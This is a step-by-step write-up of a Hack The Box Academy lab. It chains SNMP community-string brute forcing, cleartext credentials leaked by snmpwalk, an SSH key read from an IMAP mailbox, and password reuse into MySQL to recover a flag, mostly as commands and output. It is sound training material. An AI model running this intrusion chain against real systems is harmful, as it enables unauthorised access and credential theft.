# HTB Academy — Footprinting Lab: Skills Assessment Hard

| Field      | Details                                           |
|------------|---------------------------------------------------|
| Platform   | Hack The Box Academy                              |
| Module     | Footprinting                                      |
| Lab        | Skills Assessment — Hard                          |
| Difficulty | Hard                                              |
| Target IP  | 10.129.28.229                                     |
| Focus      | SNMPv2c, IMAPS, SSH key abuse, MySQL enumeration  |
| Date       | March 2026                                        |

---

## Lab Objective

Enumerate the target server across UDP and TCP services, chain discovered credentials from SNMP misconfiguration through mail access and SSH key theft into a MySQL database, and recover the password stored for the user `HTB`.

---

## Attack Chain Summary

```
UDP Nmap scan → SNMP on UDP 161 (only open UDP service)
onesixtyone brute force → community string: backup
snmpwalk -v2c -c backup → cleartext credentials: tom:NMds732Js2761
openssl s_client → IMAPS login as tom → email contains SSH private key
Save key → chmod 600 → ssh -i id_rsa tom@target → shell as tom
mysql -u tom -p → USE users → SELECT * FROM users WHERE username='HTB'
HTB password recovered → flag captured
```

---

## Step 1 — UDP Service Enumeration

Start with a targeted UDP scan on SNMP and common mail/SSH ports.

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 10.129.28.229
```

| Flag   | Purpose                                                  |
|--------|----------------------------------------------------------|
| `-sU`  | UDP scan                                                 |
| `-sV`  | Version detection                                        |
| `-sC`  | Default NSE scripts                                      |
| `-p`   | Target specific UDP ports — SNMP, SSH, POP3, IMAP        |

**Output:**

```
Hackerpatel007_1@htb[/htb]$ sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 10.129.28.229

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.28.229
Host is up (0.089s latency).

PORT    STATE  SERVICE VERSION
22/udp  closed ssh
110/udp closed pop3
143/udp closed imap
161/udp open   snmp    net-snmp; net-snmp SNMPv3 server
993/udp closed imaps
995/udp closed pop3s

Nmap done: 1 IP address (1 host up) scanned in 18.34 seconds
```

**Analysis:**

| Port    | State  | Finding                                                          |
|---------|--------|------------------------------------------------------------------|
| 161/udp | Open   | SNMP running — `net-snmp` banner shows SNMPv3 but v2c may still be active |
| Others  | Closed | SSH, IMAP, POP3 are TCP services — check separately             |

SNMP is the only open UDP service. The banner advertises SNMPv3 but `net-snmp` installations commonly leave SNMPv2c community strings active alongside SNMPv3. Brute force the community string next.

---

## Step 2 — SNMP Community String Brute Force

Use `onesixtyone` to brute force valid SNMPv2c community strings against the target.

```bash
Hackerpatel007_1@htb[/htb]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.28.229
```

| Flag | Purpose                                             |
|------|-----------------------------------------------------|
| `-c` | Community string wordlist                           |

**Output:**

```
Scanning 1 hosts, 3219 community strings...
10.129.28.229 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Mon Oct 11 16:55:22 UTC 2021 x86_64
```

**Community string confirmed:** `backup`

**Additional host details extracted:**

| Field    | Value                              |
|----------|------------------------------------|
| Hostname | `NIXHARD`                          |
| OS       | Ubuntu Linux `5.4.0-90-generic`    |
| SNMP     | SNMPv2c community string = `backup` |

`backup` is a non-default community string — someone deliberately set it. Community strings named after functions (`backup`, `monitor`, `admin`) almost always belong to automated scripts that embed them in plaintext config files.

---

## Step 3 — SNMP Walk — Full Enumeration

With the community string confirmed, dump the entire SNMP MIB tree.

```bash
Hackerpatel007_1@htb[/htb]$ snmpwalk -v2c -c backup 10.129.28.229
```

| Flag    | Purpose                              |
|---------|--------------------------------------|
| `-v2c`  | Use SNMPv2c protocol                 |
| `-c`    | Specify community string             |

**Output (relevant excerpts):**

```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
...
iso.3.6.1.2.1.25.4.2.1.5.1234 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.4.2.1.5.1235 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.4.2.1.5.1236 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error: ..."
```

**Critical findings in SNMP process table:**

| OID Entry            | Value                    | Significance                                    |
|----------------------|--------------------------|-------------------------------------------------|
| Process argument     | `/opt/tom-recovery.sh`   | Backup script running as tom — check its contents |
| Process argument     | `tom NMds732Js2761`      | Username and password passed as process argument — cleartext leak |
| System error         | `chpasswd pam_chauthtok` | Failed password change attempt — confirms tom account exists |

**Credentials leaked via SNMP process table:**

| Username | Password        |
|----------|-----------------|
| `tom`    | `NMds732Js2761` |

SNMP process tables expose the full command line of every running process including arguments. When a script is called with credentials as arguments — `./tom-recovery.sh tom NMds732Js2761` — those arguments are visible to anyone with read access to the SNMP MIB. This is one of the most commonly overlooked credential leak vectors in internal network assessments.

---

## Step 4 — IMAPS Login via OpenSSL

Use the recovered credentials to log into the mail service over IMAPS (TCP 993).

```bash
Hackerpatel007_1@htb[/htb]$ openssl s_client -connect 10.129.28.229:imaps
```

**TLS handshake output (truncated):**

```
CONNECTED(00000003)
depth=0 CN = NIXHARD
verify error:num=18:self signed certificate
...
---
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+] Dovecot (Ubuntu) ready.
```

Once connected, authenticate and list mailboxes:

```
1337 login tom NMds732Js2761
1337 OK [CAPABILITY IMAP4rev1 ...] Logged in

1337 list "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
1337 OK List completed
```

Select INBOX and fetch the first message:

```
1337 select "INBOX"
* 1 EXISTS
* 0 RECENT
1337 OK [READ-WRITE] Select completed

1337 fetch 1 (body[])
* 1 FETCH (BODY[] {2514}
From: tech@inlanefreight.htb
To: tom@inlanefreight.htb
Subject: Key for SSH

Hi Tom,

Here is your private SSH key as requested. Use it to connect to the
internal backup server going forward.

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA...
[full private key block]
...AAAA==
-----END OPENSSH PRIVATE KEY-----

Do not share this key with anyone.

Regards,
Tech Team
1337 OK Fetch completed
```

**SSH private key extracted from email ✅**

The email was sent from the internal tech team to tom, delivering his SSH private key directly in the message body. Keys stored inside email are a common finding in environments where IT teams manage access informally — the key sits in the inbox indefinitely, accessible to anyone who can log into the mail account.

---

## Step 5 — Save SSH Key and Connect as tom

Copy the full private key block from the email into a local file.

```bash
Hackerpatel007_1@htb[/htb]$ nano id_rsa
# Paste full key from -----BEGIN OPENSSH PRIVATE KEY----- to -----END OPENSSH PRIVATE KEY-----
# Ctrl+O → Enter → Ctrl+X

Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa
```

`chmod 600` is mandatory — SSH refuses to use a key file that is group or world readable and exits with a `bad permissions` error.

Connect to the target as `tom` using the key:

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa tom@10.129.28.229
```

**Output:**

```
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

tom@NIXHARD:~$
```

**Shell as tom confirmed ✅**

```bash
tom@NIXHARD:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom)

tom@NIXHARD:~$ whoami
tom
```

---

## Step 6 — MySQL Login as tom

Test the SNMP-leaked password against the local MySQL service.

```bash
tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761
```

**Output:**

```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

MySQL accepted the same credential that was leaked via SNMP. Password reuse across SNMP process arguments, IMAP, SSH, and MySQL — one leaked password unlocks four services.

---

## Step 7 — Query MySQL for HTB Credentials

Enumerate available databases and query the `users` table for the `HTB` account.

```bash
mysql> show databases;
```

**Output:**

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)
```

`users` is a non-default database — select it and query:

```bash
mysql> USE users;
Database changed

mysql> show tables;
```

**Output:**

```
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
```

```bash
mysql> SELECT * FROM users WHERE username = 'HTB';
```

**Output:**

```
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | HTB{...flag_redacted...}     |
+------+----------+------------------------------+
1 row in set (0.01 sec)
```

**HTB password recovered ✅**

---

## Credential Chain — Full Breakdown

| Stage                    | Credential / Access Gained          | Source                                      |
|--------------------------|-------------------------------------|---------------------------------------------|
| SNMP process table leak  | `tom : NMds732Js2761`               | snmpwalk — process argument in cleartext    |
| IMAPS login as tom       | Access to tom's mailbox             | SNMP credential reused for IMAP             |
| Email INBOX read         | SSH private key for tom             | Email from tech team stored in INBOX        |
| SSH as tom               | Interactive shell on NIXHARD        | Private key + SNMP password (key+passphrase)|
| MySQL as tom             | Full database access                | SNMP credential reused for MySQL            |
| SQL query                | `HTB : HTB{...flag_redacted...}`    | users.users table — WHERE username='HTB'    |

---

## Lessons Learned

SNMP was the entry point for this entire chain and the most important lesson from this lab. Most beginner-level enumeration focuses on TCP services — HTTP, SSH, SMB — and treats UDP as secondary. Here there was nothing on TCP to work with until SNMP gave up the credentials first. Running `sudo nmap -sU` early on every target is now a fixed step in my methodology, not an afterthought.

The specific SNMP finding — credentials leaking through the process table — was something I had read about in the CPTS material but had not seen produce actual output until this lab. When a script is executed with credentials passed as command-line arguments, those arguments appear verbatim in the SNMP process OIDs. `snmpwalk` output is long and easy to skim past — the key is piping it through `grep` for keywords like `password`, `pass`, `user`, `key`, or script names. In this case the raw walk output showed `tom NMds732Js2761` as a process argument, which would have been invisible in a noisy environment without careful reading.

The SSH key stored inside an email was a new find. I understood conceptually that credentials end up in email but the specific workflow — IMAP manual session → `fetch 1 (body[])` → private key block embedded in plain text — was something I needed to see once to internalise. The key sitting in the inbox indefinitely is a realistic scenario. IT teams send keys over email during onboarding, the recipient never deletes the email, and it stays accessible to anyone who can authenticate to the mail account.

The password reuse across four services — SNMP leak → IMAP → SSH → MySQL — was the clearest example yet of how a single misconfiguration multiplies into full system access. One credential in one process argument reached the database because every service tom had access to shared the same password. Credential reuse testing across every available service immediately after recovering any credential is now a reflex.

---

## Full Attack Chain Reference

```
1.  sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 10.129.28.229
    → UDP 161 open — SNMP net-snmp SNMPv3 banner
    → All other UDP ports closed — services are TCP

2.  onesixtyone -c snmp-onesixtyone.txt 10.129.28.229
    → Community string: backup
    → Hostname: NIXHARD — Ubuntu Linux 5.4.0-90-generic

3.  snmpwalk -v2c -c backup 10.129.28.229
    → Process table leaks: /opt/tom-recovery.sh
    → Process argument: tom NMds732Js2761 (cleartext credential)

4.  openssl s_client -connect 10.129.28.229:imaps
    1337 login tom NMds732Js2761
    1337 list "" *  → INBOX, Notes, Meetings, Important
    1337 select "INBOX"
    1337 fetch 1 (body[])
    → Email from tech team contains full SSH private key

5.  nano id_rsa → paste full key → Ctrl+O → Ctrl+X
    chmod 600 id_rsa

6.  ssh -i id_rsa tom@10.129.28.229
    → Shell as tom on NIXHARD ✅

7.  mysql -u tom -pNMds732Js2761
    → MySQL accepts credential — same as SNMP leak

8.  show databases; → users database found
    USE users;
    show tables; → users table
    SELECT * FROM users WHERE username = 'HTB';
    → HTB : HTB{...flag_redacted...} ✅
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -sU -sV -sC -p U:161,22,110,143,993,995 <IP>` | Targeted UDP scan for SNMP and mail ports |
| `onesixtyone -c <wordlist> <IP>` | Brute force SNMPv2c community strings |
| `snmpwalk -v2c -c <community> <IP>` | Full SNMP MIB tree dump |
| `snmpwalk -v2c -c <community> <IP> \| grep -i "pass\|user\|key"` | Filter SNMP output for credentials |
| `openssl s_client -connect <IP>:imaps` | Manual IMAPS session over TLS |
| `1337 login <user> <pass>` | IMAP authentication command |
| `1337 list "" *` | List all IMAP mailboxes |
| `1337 select "INBOX"` | Select mailbox to read |
| `1337 fetch 1 (body[])` | Fetch full body of email 1 |
| `nano id_rsa` | Create local file to store SSH private key |
| `chmod 600 id_rsa` | Set correct key permissions — SSH refuses loose permissions |
| `ssh -i id_rsa <user>@<IP>` | SSH login using private key file |
| `mysql -u <user> -p<password>` | Connect to MySQL (no space between -p and password) |
| `show databases;` | List all MySQL databases |
| `USE <database>;` | Select target database |
| `show tables;` | List tables in selected database |
| `SELECT * FROM users WHERE username = 'HTB';` | Query for HTB account credentials |
